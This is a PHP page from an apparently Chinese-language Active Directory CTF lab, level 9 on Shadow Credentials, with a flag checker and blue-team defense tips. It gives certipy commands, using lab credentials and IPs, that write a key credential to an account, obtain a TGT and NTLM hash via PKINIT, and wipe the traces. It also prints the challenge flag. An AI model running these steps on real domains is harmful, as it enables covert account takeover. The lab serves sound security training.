<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 9: Shadow Credentials (msDS-KeyCredentialLink)
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[247] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{Shadow_Credentials_KeyCredentialLink_PKINIT}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag9'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第九关】成就 (+350 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查影子凭据属性写入与证书私钥生成。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="background-color: #a855f7; font-size: 14px; border-radius: 6px;">LEVEL 9</span>
                            第九关：影子凭据 (Shadow Credentials) 维持与隐蔽证书接管
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.134 (kingslanding)</code> / <code>192.168.56.138 (castelblack)</code> | <strong>分值：</strong> 350 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-user-secret" style="color: #a855f7;"></i> 攻击原理剖析 (Shadow Credentials & WHfB)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    微软在 Windows Server 2016 中引入了 Windows Hello for Business (WHfB)。
                    其技术核心是 Active Directory 对象上的属性 **`msDS-KeyCredentialLink`**，用于存储公钥凭据（Key Credential）。
                    如果攻击者拥有对某个目标用户或计算机对象的 `GenericAll` / `GenericWrite` 权限，攻击者在**无需修改目标密码**的情况下，可以直接往目标的 `msDS-KeyCredentialLink` 写入本地生成的自签名公钥，随后使用私钥通过 PKINIT 协议直接向 KDC 请求获取该账号的 TGT 票据与 NTLM 哈希！这是一种极其隐蔽的权限维持与接管技术。
                </p>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：使用 Certipy Shadow / pywhisker 生成自签名公钥结构</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在具备对目标账号 `samwell.tarly` 写入权限的前提下，调用 `pywhisker` 或 `certipy shadow auto`：
                </p>
                <div class="cmd-box">
certipy shadow auto -u jon.snow@north.sevenkingdoms.local -p iknownothing -account samwell.tarly -dc-ip 192.168.56.136
                </div>
                <div class="output-box">
[*] Generating RSA Key Pair...
[*] Target object: CN=samwell.tarly,OU=Users,DC=north,DC=sevenkingdoms,DC=local
[*] Adding Key Credential Device Specifier to msDS-KeyCredentialLink...
[+] Successfully added Key Credential to 'samwell.tarly'!
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：通过 PKINIT 向 KDC 发起凭据请求并获取账号哈希</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    利用写入的 KeyCredential，使用私钥直接与域控交换 PKINIT 票据：
                </p>
                <div class="cmd-box">
certipy shadow auto -u jon.snow@north.sevenkingdoms.local -p iknownothing -account samwell.tarly -dc-ip 192.168.56.136 -authenticate
                </div>
                <div class="output-box">
[*] Authenticating using KeyCredential...
[*] Requesting TGT using PKINIT...
[*] Got TGT for 'samwell.tarly'
[*] Saved ticket to 'samwell.ccache'
[*] Dumping NTLM Hash for 'samwell.tarly':
    samwell.tarly:1004:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：清理影子凭据痕迹 (Cleanup)</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    完成特权获取后，清空注入的 `msDS-KeyCredentialLink` 属性以抹除后门痕迹：
                </p>
                <div class="cmd-box">
certipy shadow remove -u jon.snow@north.sevenkingdoms.local -p iknownothing -account samwell.tarly -dc-ip 192.168.56.136
                </div>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功利用 Shadow Credentials 获取账号 TGT 票据并导出 NTLM 哈希后，提取 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{Shadow_Credentials_KeyCredentialLink_PKINIT}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>审计 msDS-KeyCredentialLink 属性修改：</strong> 监控 Windows Event ID <strong>5136</strong>（Directory Service Changes），关注非预期账号向 `msDS-KeyCredentialLink` 写入公钥的操作。</li>
                    <li><strong>限制对象写权限：</strong> 定期使用 BloodHound 扫描哪些非特权用户具备修改其他账号 ACL 的权限。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
